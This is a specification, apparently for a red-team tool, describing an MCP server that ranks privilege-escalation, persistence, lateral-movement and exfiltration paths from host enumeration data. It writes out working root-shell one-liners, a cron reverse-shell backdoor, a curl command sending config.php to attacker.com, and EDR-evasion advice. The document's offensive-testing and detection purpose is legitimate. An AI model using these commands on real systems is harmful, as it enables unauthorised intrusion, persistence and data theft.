# Living-off-the-Land MCP -- Environment-Aware LOL Attack Path Engine

**Project:** CyberStrike LOL MCP Server
**Author:** AUM Labs LLC
**Version:** 1.0 Draft
**Date:** July 2026
**Status:** Architecture & Specification
**License:** AGPL-3.0 (CyberStrike ecosystem)

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Problem Statement](#2-problem-statement)
3. [The LOL Ecosystem -- Full Catalog Inventory](#3-the-lol-ecosystem----full-catalog-inventory)
4. [Data Source Architecture](#4-data-source-architecture)
5. [The Core Differentiator -- Environment-Aware Reasoning](#5-the-core-differentiator----environment-aware-reasoning)
6. [Graph Model -- Nodes, Edges, and Attack Chains](#6-graph-model----nodes-edges-and-attack-chains)
7. [Attack Path Algorithms](#7-attack-path-algorithms)
8. [Stealth & Detection Surface Scoring](#8-stealth--detection-surface-scoring)
9. [MCP Tool Definitions](#9-mcp-tool-definitions)
10. [Platform Modules](#10-platform-modules)
11. [MITRE ATT&CK Integration](#11-mitre-attck-integration)
12. [Agent Reasoning Scenarios](#12-agent-reasoning-scenarios)
13. [CyberStrike Integration](#13-cyberstrike-integration)
14. [Differentiation from Existing Tools](#14-differentiation-from-existing-tools)
15. [Implementation Roadmap](#15-implementation-roadmap)
16. [Appendix A: LOL Catalog Data Formats](#16-appendix-a-lol-catalog-data-formats)
17. [Appendix B: Privilege Escalation Decision Trees](#17-appendix-b-privilege-escalation-decision-trees)

---

## 1. Executive Summary

The Living-off-the-Land MCP is an environment-aware attack path reasoning engine that unifies the entire LOL ecosystem (19+ community catalogs, 2,000+ techniques across Windows, Linux, macOS, drivers, APIs, CI/CD pipelines, RMM tools, trusted sites, and hardware) into a single MCP server. It answers the question every red teamer asks after landing on a target: *"Given what's on this box right now, what are my paths to escalation, persistence, lateral movement, and exfiltration using only what's already here?"*

Unlike existing tools that provide static lookup tables ("certutil can download files"), this MCP takes the target environment's actual state as input (installed binaries, sudo configuration, SUID bits, capabilities, scheduled tasks, loaded drivers, OS version, EDR presence) and produces **ranked, chained attack paths** with stealth scoring and detection surface analysis. It reasons over the environment the way an experienced red teamer does: "you have sudo access to find, that's a one-step root shell; but the host also runs Sysmon, so the stealthier path is abusing a writable cron job via the vi SUID bit."

This is the host-level counterpart to the Cloud Attack Path MCP. Where Cloud Attack Path finds identity attack chains across AWS/Azure/GCP, the LOL MCP finds binary/tool attack chains across endpoints. Together, they give CyberStrike full-stack attack path coverage from cloud IAM down to individual host privilege escalation.

---

## 2. Problem Statement

### 2.1 The Red Team Bottleneck

After gaining initial access, a red teamer or penetration tester lands on a host and begins post-exploitation enumeration. The workflow is manual, repetitive, and knowledge-intensive:

1. Run `sudo -l` to see what they can run as root
2. Run `find / -perm -4000` to list SUID binaries
3. Run `getcap -r /` to find binaries with capabilities
4. Check cron jobs, writable paths, kernel version
5. Cross-reference each finding against GTFOBins (manually, in a browser tab)
6. Determine which of the dozens of potential techniques actually chain together
7. Consider which techniques the target's defenses would detect
8. Pick the best path and execute

Steps 5-8 are where expertise lives. A junior tester finds the SUID `python3` binary but doesn't know to chain it with a writable `/etc/cron.d` entry for persistence. A senior tester knows that `certutil` download works but also knows Defender flags it, while `BITSAdmin` transfer is quieter. This expertise is not codified anywhere in machine-readable, environment-aware form.

### 2.2 The Fragmentation Problem

The LOL ecosystem has grown into 19+ separate community projects, each maintained independently:

- A red teamer doing a Windows engagement cross-references LOLBAS + LOLDrivers + WADComs + MalAPI + LOTS + LOLRMM + LOLGlobs + LoLCerts + LOTP
- A red teamer on Linux cross-references GTFOBins + LOTS
- A red teamer on macOS cross-references LOOBins + GTFOBins + LOTS
- Nobody cross-references all of them because nobody has combined them

Each catalog is a static reference. None of them takes environment input. None of them reasons about chains. None of them scores stealth. None of them exists as an MCP.

### 2.3 The Opportunity

An MCP that:
1. **Unifies** every LOL catalog into a single queryable knowledge base
2. **Takes environment state** (not just a binary name) as input
3. **Reasons about chains** (multi-step paths, not isolated techniques)
4. **Scores stealth** (which path triggers the fewest detection rules)
5. **Maps to ATT&CK** (every step has a technique ID)
6. **Shows the blue team view** (what detection rules would catch this)

This is the "AI that thinks like a red teamer" applied to post-exploitation. The viral concept is clear: **give the MCP your host's enumeration data and it tells you how to escalate, persist, move laterally, and exfiltrate using only what's already on the box.**

---

## 3. The LOL Ecosystem -- Full Catalog Inventory

The MCP ingests and unifies the following 19 community-driven catalogs. This is the most comprehensive consolidation of LOL data attempted in any single tool.

### 3.1 Core Binary/Script Catalogs

| Catalog | Platform | Count | Functions | Data Format | API/Source |
|---|---|---|---|---|---|
| **GTFOBins** | Linux/Unix | 478 binaries | Shell, File-read, File-write, Upload, Download, Command, Reverse-shell, Bind-shell, Privilege-escalation, Library-load, Inherit | YAML (Jekyll) | gtfobins.github.io |
| **LOLBAS** | Windows | 200+ binaries/scripts/libraries | Execute, ADS, AWL Bypass, Copy, Credentials, Compile, Decode, Download, Encode, Execute, Reconnaissance, Upload, Persistence | YAML, JSON API | lolbas-project.github.io/api/lolbas.json |
| **LOOBins** | macOS | Growing catalog | Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Exfiltration | YAML, JSON API, PyLOOBins SDK | loobins.io |

### 3.2 Specialized Catalogs

| Catalog | Focus | Content | Data Format |
|---|---|---|---|
| **LOLDrivers** | Windows kernel drivers | 615 unique drivers, 2,121 vulnerable samples. Categories: vulnerable, malicious, known-malicious. BYOVD attack enablement. Certificate chains, YARA/Sigma/Sysmon rules. | YAML, JSON API (loldrivers.io/api/drivers.json) |
| **MalAPI** | Windows APIs | Windows API functions commonly abused by malware. Categories: injection, evasion, spying, internet, anti-debugging, ransomware, helper. Includes sleep() for sandbox evasion. | Web catalog |
| **WADComs** | Windows/AD commands | Interactive cheat sheet with offensive security commands for Windows and Active Directory environments. Filterable by attack category. | YAML |
| **LOLGlobs** | Command obfuscation | Glob-based command obfuscation techniques for Linux, macOS, Windows CMD, and PowerShell. Bypass signature-based detection in AV, EDR, and WAF. | GitHub |
| **WTFBins** | False positive reference | Legitimate applications that exhibit suspicious behavior, generating noise in threat hunting. Inverse LOLBins: helps red teamers understand what "normal suspicious" looks like. | GitHub |

### 3.3 Infrastructure & Lateral Movement Catalogs

| Catalog | Focus | Content |
|---|---|---|
| **LOTS Project** | Living Off Trusted Sites | Legitimate popular domains (github.com, pastebin.com, discord.com, etc.) abused for phishing, C2 communication, exfiltration, and tool delivery. URL patterns that evade domain-based detection. |
| **LOFLCABs** | Living Off the Foreign Land | Cmdlets and binaries that perform activities from the local Windows system against a remote system. Lateral movement via native tools. |
| **LOLC2** | C2 via legitimate services | C2 frameworks that leverage legitimate cloud/SaaS services (Slack, Discord, GitHub, Notion, Google Sheets) to evade network detection. |
| **LOLEXFIL** | Data exfiltration | Exfiltration reference covering LOLBins, RMM tools, cloud storage, tunneling protocols. Each with detection patterns, simulation commands, DFIR artifacts, IOCs, and ATT&CK mappings. |
| **LoTWH** | Living Off The Webhooks | Webhook services (Slack, Discord, Teams, custom) abused for data exfiltration and C2 communications. |
| **LOTTunnels** | Living Off The Tunnels | Legitimate tunneling services (ngrok, Cloudflare Tunnel, etc.) abused for exfiltration, persistence, and shell access. |
| **LOLRMM** | Remote Monitoring & Mgmt | RMM tools (AnyDesk, TeamViewer, ConnectWise, etc.) that threat actors abuse for persistence and remote access. Pre-installed in many enterprises. |

### 3.4 Specialized Platform & Supply Chain Catalogs

| Catalog | Focus | Content |
|---|---|---|
| **LOLESXi** | VMware ESXi | Binaries/scripts natively available in VMware ESXi that adversaries have utilized (vim-cmd, esxcli, python on ESXi). Ransomware operators love these. |
| **LOTP** | Living Off The Pipeline | CI/CD tools with lesser-known RCE-by-design features ("foot guns") that enable arbitrary code execution through untrusted changes or workflow injection. GitHub Actions, Jenkins, GitLab CI. |
| **LoLCerts** | Living Off Leaked Certs | Code-signing certificates known to have been leaked or stolen, then used to sign malware. Certificate chain and abuse history. |
| **LOTHardware** | Living Off The Hardware | Hardware-based attack techniques: USB rubber ducky, bad USB, hardware implants, BIOS/UEFI abuse, debug interfaces. |
| **Persistence Info** | Windows persistence | Comprehensive catalog of Windows persistence mechanisms (registry, scheduled tasks, WMI, services, COM hijacking, AppInit DLLs, etc.), organized for protection and detection. |
| **LOLBins CTI-Driven** | Threat intel overlay | Maps real-world threat actor LOLBin usage during documented intrusions into graphical, STIX-formatted data. Which APT used which LOLBin in which campaign. |

### 3.5 Total Technique Count Estimate

```
GTFOBins:         478 binaries x multiple functions/contexts     ~  2,500+ technique entries
LOLBAS:           200+ entries x multiple commands                ~  1,000+ technique entries
LOOBins:          Growing catalog                                 ~    150+ technique entries
LOLDrivers:       615 drivers x 2,121 vulnerable samples          ~  2,700+ entries
WADComs:          AD/Windows command reference                    ~    200+ entries
MalAPI:           Windows API abuse catalog                       ~    100+ entries
LOTS:             Trusted domain abuse                            ~    300+ entries
LOFLCABs:         Remote administration binaries                  ~    100+ entries
LOLRMM:           RMM tool catalog                                ~     80+ entries
LOLGlobs:         Obfuscation patterns                            ~     50+ entries
LOLESXi:          ESXi binaries                                   ~     30+ entries
LOTP:             CI/CD foot guns                                 ~     50+ entries
Others:           LOLC2, LOLEXFIL, LoTWH, LOTTunnels, etc.       ~    200+ entries
                                                                  ─────────────────
TOTAL UNIFIED KNOWLEDGE BASE:                                     ~  7,500+ entries
```

**No existing tool, MCP or otherwise, has ever unified these 19 catalogs into a single queryable knowledge base.**

---

## 4. Data Source Architecture

### 4.1 Catalog Ingestion Pipeline

Each LOL catalog is maintained in a different format. The MCP normalizes them all into a unified internal schema.

```
┌──────────────────────────────────────────────────────────────────┐
│                    Catalog Ingestion Pipeline                      │
│                                                                   │
│  ┌───────────┐  ┌───────────┐  ┌───────────┐  ┌───────────┐     │
│  │ GTFOBins  │  │  LOLBAS   │  │ LOOBins   │  │LOLDrivers │     │
│  │ (YAML/    │  │ (JSON API │  │ (JSON API │  │ (JSON API │     │
│  │  Jekyll)  │  │  + YAML)  │  │  + Python)│  │  + YAML)  │     │
│  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘     │
│        │              │              │              │             │
│        ▼              ▼              ▼              ▼             │
│  ┌────────────────────────────────────────────────────────────┐   │
│  │              Normalization Layer                            │   │
│  │  - Parse platform-specific formats                         │   │
│  │  - Map to Unified LOL Entry schema                         │   │
│  │  - Resolve ATT&CK technique IDs                            │   │
│  │  - Tag with platform, privilege requirement, function      │   │
│  │  - Cross-reference (GTFOBins python = LOOBins python3)     │   │
│  └────────────────────────┬───────────────────────────────────┘   │
│                           │                                       │
│                           ▼                                       │
│  ┌────────────────────────────────────────────────────────────┐   │
│  │            Unified LOL Knowledge Base                       │   │
│  │  ~7,500+ normalized entries                                 │   │
│  │  Indexed by: binary name, platform, function,               │   │
│  │  privilege level, ATT&CK technique, detection rules         │   │
│  └────────────────────────────────────────────────────────────┘   │
└──────────────────────────────────────────────────────────────────┘
```

### 4.2 Unified LOL Entry Schema

Every entry from every catalog is normalized to this schema:

```yaml
id: "gtfobins-python-sudo-shell"
binary: "python"
platform: "linux"              # linux | windows | macos | esxi | cicd | network
catalog_source: "gtfobins"     # which LOL catalog it came from
category: "binary"             # binary | script | library | driver | api | service | site | rmm | cert
functions:                     # what this technique can do
  - shell                      # spawn interactive shell
  - file_read                  # read arbitrary files
  - file_write                 # write arbitrary files
  - reverse_shell              # connect-back shell
  - privilege_escalation       # escalate to higher privilege
  - download                   # download files from internet
  - upload                     # exfiltrate data
  - persistence                # survive reboot
  - lateral_movement           # reach other systems
  - defense_evasion            # bypass security controls
  - credential_access          # steal credentials
  - command_execution          # execute arbitrary commands
  - library_load               # load shared library
  - encode_decode              # encode/decode data
execution_contexts:            # under what conditions this works
  - context: "sudo"            # sudo | suid | capabilities | unprivileged | admin | system
    prerequisite: "sudo python allowed in sudoers"
    command: "sudo python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
    result: "root shell"
    one_liner: true
  - context: "suid"
    prerequisite: "SUID bit set on python binary"
    command: "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
    result: "shell as file owner (usually root)"
    one_liner: true
attck_techniques:              # MITRE ATT&CK mapping
  - "T1059.006"                # Command and Scripting Interpreter: Python
  - "T1548.001"                # Abuse Elevation Control Mechanism: SUID/SGID
detection:
  sigma_rules:                 # known Sigma detection rules
    - "proc_creation_lnx_python_shell_spawn"
  sysmon_events:               # Sysmon event IDs to watch
    - 1                        # Process creation
  log_sources:                 # where evidence appears
    - "auditd"
    - "syslog"
  edr_coverage: "high"         # none | low | medium | high
stealth_score: 3               # 1 (very stealthy) to 5 (very noisy)
stealth_notes: "Python is commonly installed and used on many Linux systems. However, spawning /bin/sh from python is a well-known detection pattern."
os_versions:                   # which OS versions have this binary
  - "Ubuntu 18.04+"
  - "Debian 10+"
  - "CentOS 7+"
  - "RHEL 7+"
  - "Kali Linux"
related_entries:               # cross-catalog links
  - "loobins-python3"          # same binary on macOS
  - "lolbas-python.exe"        # Windows equivalent
chain_potential:               # what this can chain into
  - "If python has file_write, can modify cron for persistence"
  - "If python can download, can stage second-stage payload"
```

### 4.3 Catalog Update Strategy

The knowledge base is refreshed from upstream catalogs at build time or on-demand:

- **LOLBAS**: `GET https://lolbas-project.github.io/api/lolbas.json` (single JSON file, all entries)
- **GTFOBins**: Clone `https://github.com/GTFOBins/GTFOBins.github.io`, parse `_gtfobins/*.md` (Jekyll markdown with YAML frontmatter)
- **LOOBins**: PyLOOBins SDK or `GET` JSON API from loobins.io
- **LOLDrivers**: `GET https://www.loldrivers.io/api/drivers.json`
- **WADComs**: Clone GitHub repo, parse YAML
- **LOTS, LOLRMM, LOFLCABs, etc.**: Clone respective repos, parse per format

The MCP ships with a bundled snapshot and supports `update_knowledge_base` to pull fresh data.

---

## 5. The Core Differentiator -- Environment-Aware Reasoning

### 5.1 What Makes This Different from Every Existing Tool

Every existing LOL tool (GTFOBins website, gtfo CLI, LOLBAS web frontend, Unit-259/lolbins PowerShell module, livingofftheland.dev payload builder) provides **static lookup**: give it a binary name, get back what it can do. The user must:

1. Enumerate the target manually
2. Look up each binary individually
3. Determine which techniques are applicable given their specific context
4. Figure out chains between techniques on their own
5. Assess stealth on their own

The LOL MCP takes **environment state as input** and does all five steps:

```
INPUT (from target enumeration):
{
  "platform": "linux",
  "os": "Ubuntu 22.04",
  "kernel": "5.15.0-91-generic",
  "current_user": "www-data",
  "sudo_entries": [
    "www-data ALL=(ALL) NOPASSWD: /usr/bin/find",
    "www-data ALL=(ALL) NOPASSWD: /usr/bin/less"
  ],
  "suid_binaries": [
    "/usr/bin/python3.10",
    "/usr/bin/vim.basic",
    "/usr/bin/env"
  ],
  "capabilities": [
    {"binary": "/usr/bin/perl", "caps": "cap_setuid+ep"}
  ],
  "writable_paths": [
    "/etc/cron.d/",
    "/tmp/",
    "/var/www/html/"
  ],
  "installed_binaries": ["python3", "perl", "ruby", "nc", "socat", "curl", "wget", "gcc"],
  "running_services": ["apache2", "mysql", "cron", "sshd"],
  "edr_detected": "none",
  "network_access": {
    "outbound_http": true,
    "outbound_dns": true,
    "internal_subnets": ["10.10.10.0/24"]
  },
  "sensitive_files_readable": [
    "/etc/shadow (no)",
    "/home/*/.ssh/id_rsa (no)",
    "/var/www/html/config.php (yes)"
  ]
}

OUTPUT (from MCP reasoning):
{
  "escalation_paths": [
    {
      "rank": 1,
      "path": "One-Step Root via sudo find",
      "steps": [
        {
          "action": "sudo find . -exec /bin/sh -p \\; -quit",
          "source": "gtfobins-find-sudo-shell",
          "result": "root shell",
          "attck": "T1548.003",
          "stealth_score": 2,
          "detection": "auditd sudo log, but find is commonly used with sudo"
        }
      ],
      "total_stealth": 2,
      "confidence": "certain"
    },
    {
      "rank": 2,
      "path": "SUID python3 to root shell",
      "steps": [
        {
          "action": "python3.10 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
          "source": "gtfobins-python-suid-shell",
          "result": "root shell (via SUID owner)",
          "attck": "T1548.001",
          "stealth_score": 3,
          "detection": "unusual python3 parent spawning sh"
        }
      ],
      "total_stealth": 3,
      "confidence": "certain"
    },
    {
      "rank": 3,
      "path": "perl capability abuse to root",
      "steps": [
        {
          "action": "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'",
          "source": "gtfobins-perl-capabilities-shell",
          "result": "root shell via cap_setuid",
          "attck": "T1548.001",
          "stealth_score": 2,
          "detection": "capability-based escalation rarely monitored"
        }
      ],
      "total_stealth": 2,
      "confidence": "certain"
    },
    {
      "rank": 4,
      "path": "SUID vim to root + cron persistence",
      "chain": true,
      "steps": [
        {
          "step": 1,
          "action": "vim.basic -c ':!/bin/sh' (via SUID)",
          "result": "root shell",
          "stealth_score": 3
        },
        {
          "step": 2,
          "action": "echo '* * * * * root /tmp/.rev.sh' > /etc/cron.d/backdoor",
          "result": "persistent root reverse shell every minute",
          "stealth_score": 4,
          "note": "/etc/cron.d/ is writable by www-data"
        }
      ],
      "total_stealth": 4,
      "confidence": "certain",
      "chain_reasoning": "vim SUID gives root, writable /etc/cron.d/ enables persistence"
    }
  ],
  "exfiltration_paths": [
    {
      "method": "curl POST to attacker server",
      "command": "curl -X POST -d @/var/www/html/config.php https://attacker.com/exfil",
      "stealth_score": 3,
      "alternative": "DNS exfil via dig (stealthier, score 1)"
    }
  ],
  "lateral_movement": [
    {
      "method": "SSH key harvesting attempt",
      "status": "blocked (cannot read /home/*/.ssh/)",
      "alternative": "config.php may contain DB credentials for MySQL pivot"
    }
  ],
  "recommendation": "Path 1 (sudo find) is the fastest and stealthiest escalation. For persistence, path 4 chains vim SUID with cron. No EDR detected, so stealth is less critical, but cron persistence in /etc/cron.d/ will survive reboot."
}
```

### 5.2 The Reasoning Engine

The engine works in three phases:

**Phase 1: Match** -- scan the environment state against the unified knowledge base. For each installed/available binary, check which LOL techniques are applicable given the execution context (sudo, SUID, capabilities, unprivileged).

**Phase 2: Chain** -- identify multi-step paths by linking technique outputs to technique inputs. "vim SUID gives root shell" + "/etc/cron.d/ is writable" + "cron service is running" = "vim SUID to root + cron persistence chain."

**Phase 3: Rank** -- score each path by:
- **Certainty** (will this definitely work, or does it depend on configuration?)
- **Steps** (fewer is better)
- **Stealth** (lower detection surface is better)
- **Impact** (root > user privilege; persistence > one-shot)
- **Chainability** (does this open further paths?)

---

## 6. Graph Model -- Nodes, Edges, and Attack Chains

The MCP internally represents the target environment and available techniques as a directed graph, analogous to the Cloud Attack Path MCP's approach.

### 6.1 Node Types

| Node Type | Represents | Examples |
|---|---|---|
| `CurrentUser` | The attacker's current identity | www-data, apache, limited-user |
| `TargetPrivilege` | A privilege level to reach | root, SYSTEM, Domain Admin |
| `Binary` | An installed binary/script | python3, certutil.exe, osascript |
| `Configuration` | A system configuration element | sudoers entry, SUID bit, capability, cron job, scheduled task, registry key |
| `Service` | A running service | cron, sshd, apache2, WinRM |
| `File` | A readable/writable file | /etc/shadow, config.php, SAM |
| `Network` | A reachable network target | internal subnet, internet, specific host |
| `Driver` | A loaded/loadable kernel driver | dbutil_2_3.sys, asio.sys |

### 6.2 Edge Types (Attack Relationships)

| Edge Type | From -> To | Meaning |
|---|---|---|
| `CanEscalateVia` | CurrentUser -> TargetPrivilege | A LOL technique grants higher privilege |
| `CanSpawnShell` | Binary -> TargetPrivilege | Binary can spawn a shell at a privilege level |
| `CanReadFile` | Binary -> File | Binary can read the file in current context |
| `CanWriteFile` | Binary -> File | Binary can write/overwrite the file |
| `CanDownload` | Binary -> Network | Binary can fetch from remote |
| `CanUpload` | Binary -> Network | Binary can send data to remote |
| `CanExecuteAs` | Configuration -> Binary | Config allows running binary as different user |
| `EnablesPersistence` | File/Configuration -> Service | Writing to this enables persistent execution |
| `CanReach` | Network -> Network | Network path exists to target |
| `CanLoadDriver` | Binary -> Driver | Can load a vulnerable/malicious driver |
| `CanDisableEDR` | Driver -> Configuration | Driver can disable security controls |
| `CanChainTo` | Technique -> Technique | Output of one technique feeds input of another |

### 6.3 Example Graph (Linux Post-Exploitation)

```
[www-data] ─CanEscalateVia(sudo find)─────────────> [root]
           ─CanEscalateVia(SUID python3)───────────> [root]
           ─CanEscalateVia(cap_setuid perl)────────> [root]
           ─CanEscalateVia(SUID vim)───────────────> [root]
           ─CanReadFile(config.php)────────────────> [DB creds]
           ─CanWriteFile(/etc/cron.d/)─────────────> [cron persistence]

[root] ────CanWriteFile(/etc/cron.d/)──────────────> [cron persistence]
       ────CanReadFile(/etc/shadow)────────────────> [all user hashes]
       ────CanReadFile(/home/*/.ssh/id_rsa)────────> [SSH keys]

[cron persistence] ─EnablesPersistence(cron)───────> [reverse shell every minute]

[DB creds] ─CanReach(mysql@10.10.10.5)────────────> [lateral: database server]

[curl] ────CanUpload(outbound HTTP)────────────────> [exfil to attacker]
[python3] ─CanUpload(outbound HTTP)────────────────> [exfil to attacker]
```

The shortest path from `[www-data]` to `[root]` is one edge: `sudo find`. The richest path (escalation + persistence + lateral movement) is: `SUID vim -> root -> read config.php -> DB creds -> MySQL pivot` while simultaneously `root -> write /etc/cron.d/ -> persistent shell`.

---

## 7. Attack Path Algorithms

### 7.1 Shortest Path to Target Privilege

For each target privilege level (root/SYSTEM/admin), compute the shortest directed path from the current user. Rank by path length (fewer steps = more reliable), then by stealth score.

### 7.2 All Viable Paths Enumeration

Enumerate all paths up to a configurable depth (default: 5 steps). This reveals paths that are longer but stealthier, or paths that produce additional value (persistence, credential harvesting).

### 7.3 Chain Discovery

The chain discovery algorithm connects technique outputs to technique inputs:

```
FOR each available technique T1:
  FOR each output of T1 (e.g., "root shell", "file write to /etc/cron.d/"):
    FOR each technique T2 where T2.prerequisite matches T1.output:
      CREATE edge T1 -> T2 (chain link)
      IF T2 has further outputs:
        RECURSE (depth-limited)
```

Example chain discovery:
```
T1: SUID vim -> output: root shell
T2: root can write /etc/cron.d/ -> output: cron persistence
T3: cron executes reverse shell -> output: persistent callback
Chain: vim(SUID) -> root -> cron.d write -> reverse shell persistence
```

### 7.4 Multi-Objective Ranking

Each path is scored on four dimensions, and the ranker produces a Pareto-optimal set:

```
score(path) = w1 * certainty(path)
            + w2 * (1 / steps(path))
            + w3 * (1 / stealth(path))
            + w4 * impact(path)

where:
  certainty: 1.0 = guaranteed to work, 0.5 = depends on config, 0.1 = speculative
  steps:     number of discrete actions
  stealth:   1 = invisible, 5 = will trigger every alert
  impact:    root=1.0, admin=0.8, user=0.5; persistence adds 0.2; lateral adds 0.3
```

Default weights favor certainty > stealth > impact > brevity, but the agent can adjust for the engagement's priority (e.g., a stealth-focused engagement raises w3).

---

## 8. Stealth & Detection Surface Scoring

### 8.1 Stealth Score Model

Each LOL technique receives a stealth score (1-5) based on:

```
Score 1 (Ghost):
  - Uses only bash builtins (no new process creation)
  - No file writes
  - No network activity
  - Example: bash variable manipulation, shell built-in redirection

Score 2 (Quiet):
  - Common administrative binary with expected usage pattern
  - Minimal log footprint
  - Example: using find with sudo (find is commonly sudo'd)

Score 3 (Normal):
  - Binary used in unusual way but not immediately suspicious
  - Some log entries generated
  - Example: python spawning a shell, certutil decoding a file

Score 4 (Noisy):
  - Binary used in known-suspicious pattern
  - Likely triggers basic Sigma/YARA rules
  - Example: certutil downloading a file, powershell -encodedcommand

Score 5 (Alarm):
  - Well-known attack technique with dedicated detection rules
  - Immediately flagged by EDR
  - Example: mimikatz patterns, direct LSASS access, known exploit payloads
```

### 8.2 Detection Surface Analysis

For each technique, the MCP reports which detection mechanisms would fire:

```yaml
detection_surface:
  sigma_rules:
    - rule: "proc_creation_win_lolbin_certutil_download"
      severity: "high"
      source: "SigmaHQ"
    - rule: "proc_creation_win_certutil_encode"
      severity: "medium"
  sysmon_events:
    - event_id: 1
      description: "Process creation with suspicious command line"
    - event_id: 3
      description: "Network connection from certutil"
    - event_id: 11
      description: "File created in suspicious location"
  windows_event_logs:
    - channel: "Security"
      event_id: 4688
      description: "New process created"
  edr_detection:
    - vendor: "CrowdStrike Falcon"
      likelihood: "high"
      reason: "Behavioral detection of certutil download"
    - vendor: "Microsoft Defender"
      likelihood: "high"
      reason: "Cloud-delivered protection for certutil abuse"
  mitigations:
    - "Use BITSAdmin instead (same function, lower detection)"
    - "Use PowerShell Invoke-WebRequest with HTTPS (moderate detection)"
    - "Use curl.exe (lowest detection for Windows file download)"
```

### 8.3 Purple Team Value

The same stealth/detection analysis serves both red and blue:

**Red team view:** "Use this path, it's stealthiest"
**Blue team view:** "These are the Sigma rules you need to detect this path. If path 1 is undetectable, here's what you're missing."

This dual value is why the MCP is valuable to both offensive and defensive teams, and why it will attract both red team and detection engineering GitHub stars.

---

## 9. MCP Tool Definitions

### 9.1 `enumerate_host`

Accept raw enumeration data and build the environment model.

```
Input:
  platform         : string   ("linux" | "windows" | "macos" | "esxi")
  enumeration_data : object   (structured or raw text)
    # Accepts either structured JSON (as in 5.1) or raw text output from:
    # Linux: sudo -l, find / -perm -4000, getcap -r /, cat /etc/crontab, uname -a, etc.
    # Windows: whoami /priv, icacls, schtasks /query, wmic, systeminfo, etc.
    # macOS: sudo -l, find / -perm -4000, launchctl list, sw_vers, etc.

Output:
  environment_id   : string
  platform         : string
  current_user     : string
  privilege_level  : string
  available_lol_techniques : number (how many techniques match this environment)
  summary          : string (natural language summary of the attack surface)
```

### 9.2 `find_escalation_paths`

Compute privilege escalation paths.

```
Input:
  environment_id   : string
  target_privilege : string   (default: "root" | "SYSTEM" | "admin")
  max_steps        : number   (default: 5)
  stealth_priority : boolean  (default: false; if true, rank stealthiest first)

Output:
  paths : object[] [
    {
      rank, path_name,
      steps: [ {action, binary, source_catalog, result, attck, stealth_score, detection_surface} ],
      total_stealth, certainty, impact, chain_reasoning
    }
  ]
```

### 9.3 `find_persistence_paths`

Compute persistence mechanisms available from current or escalated position.

```
Input:
  environment_id   : string
  assume_privilege : string   (optional: "root" to find persistence after escalation)

Output:
  mechanisms : object[] [
    {
      method, binary, writable_target,
      survives_reboot: boolean,
      stealth_score, detection_surface,
      attck: "T1053.003" (Scheduled Task) | "T1543.002" (Systemd Service) | etc.
    }
  ]
```

### 9.4 `find_lateral_movement`

Discover lateral movement opportunities.

```
Input:
  environment_id   : string

Output:
  opportunities : object[] [
    {
      target, method, credential_source,
      binary_used, stealth_score, detection_surface,
      requires_escalation: boolean
    }
  ]
```

### 9.5 `find_exfiltration_paths`

Compute data exfiltration methods.

```
Input:
  environment_id   : string
  target_data      : string   (optional: specific file/data to exfil)

Output:
  methods : object[] [
    {
      method, binary, protocol, stealth_score,
      bandwidth_estimate, detection_surface,
      lots_domains: string[]  (from LOTS catalog: which trusted sites can be abused)
    }
  ]
```

### 9.6 `find_defense_evasion`

Discover defense evasion techniques.

```
Input:
  environment_id   : string
  edr_product      : string   (optional: specific EDR to evade)

Output:
  techniques : object[] [
    {
      method, binary,
      evasion_type: "disable_edr" | "bypass_amsi" | "obfuscate_command" | "dll_sideload" | "driver_load",
      driver_id: string (if BYOVD, reference to LOLDrivers entry),
      stealth_score, attck
    }
  ]
```

### 9.7 `lookup_binary`

Classic lookup: what can a specific binary do?

```
Input:
  binary  : string
  platform: string (optional, auto-detect)

Output:
  entries : object[] (all unified LOL entries for this binary across all catalogs)
  cross_platform: object[] (equivalent binaries on other platforms)
  chains_into: object[] (what techniques this binary enables downstream)
```

### 9.8 `generate_payload`

Generate the specific command/payload for a chosen technique.

```
Input:
  technique_id     : string
  environment_id   : string   (to customize payload for the specific environment)
  attacker_ip      : string   (optional: for reverse shells)
  attacker_port    : number   (optional: for reverse shells)
  obfuscation      : boolean  (default: false; apply LOLGlobs obfuscation)

Output:
  command          : string   (ready-to-paste command)
  obfuscated_variant: string  (if obfuscation requested)
  cleanup_command  : string   (how to clean up artifacts after)
  detection_surface: object   (what this specific payload triggers)
```

### 9.9 `build_attack_plan`

Generate a complete multi-phase attack plan.

```
Input:
  environment_id   : string
  objectives       : string[] (["escalate", "persist", "exfil", "lateral_move"])
  stealth_priority : boolean
  max_complexity   : number   (max total steps across all phases)

Output:
  plan : object {
    phases: [
      {
        phase: "escalation",
        chosen_path: object (best path for this phase),
        reasoning: string
      },
      {
        phase: "persistence",
        chosen_mechanism: object,
        reasoning: string
      },
      {
        phase: "credential_harvesting",
        targets: object[],
        reasoning: string
      },
      {
        phase: "lateral_movement",
        targets: object[],
        reasoning: string
      },
      {
        phase: "exfiltration",
        method: object,
        reasoning: string
      }
    ],
    total_stealth_score: number,
    total_steps: number,
    attck_coverage: string[] (all ATT&CK technique IDs used),
    detection_surface_summary: object
  }
```

### 9.10 `assess_detection_gaps`

Blue team tool: given the available LOL techniques on this host, which ones are NOT covered by detection rules?

```
Input:
  environment_id   : string
  deployed_rules   : string[] (optional: list of Sigma rule IDs or SIEM rules in place)

Output:
  covered_techniques   : object[] (techniques that would be detected)
  uncovered_techniques : object[] (techniques with no matching detection rule)
  coverage_percentage  : number
  priority_gaps        : object[] (high-impact techniques with no detection)
  recommended_rules    : object[] (Sigma rules to deploy to close gaps)
```

### 9.11 `scan_drivers`

Windows-specific: scan loaded/available drivers against LOLDrivers database.

```
Input:
  environment_id   : string
  driver_list      : object[] (loaded drivers with hashes)

Output:
  vulnerable_drivers : object[] [
    {
      driver_name, hash, loldrivers_id,
      category: "vulnerable" | "malicious" | "known_malicious",
      byovd_potential: boolean,
      edr_disable_capability: boolean,
      certificate_info: object,
      detection_rules: object[] (YARA, Sigma, Sysmon rules)
    }
  ]
```

### 9.12 `update_knowledge_base`

Pull latest data from all upstream LOL catalogs.

```
Input:
  catalogs : string[] (optional: specific catalogs to update; default: all)

Output:
  updated_catalogs : object[] [{catalog, entries_before, entries_after, new_entries}]
  total_entries    : number
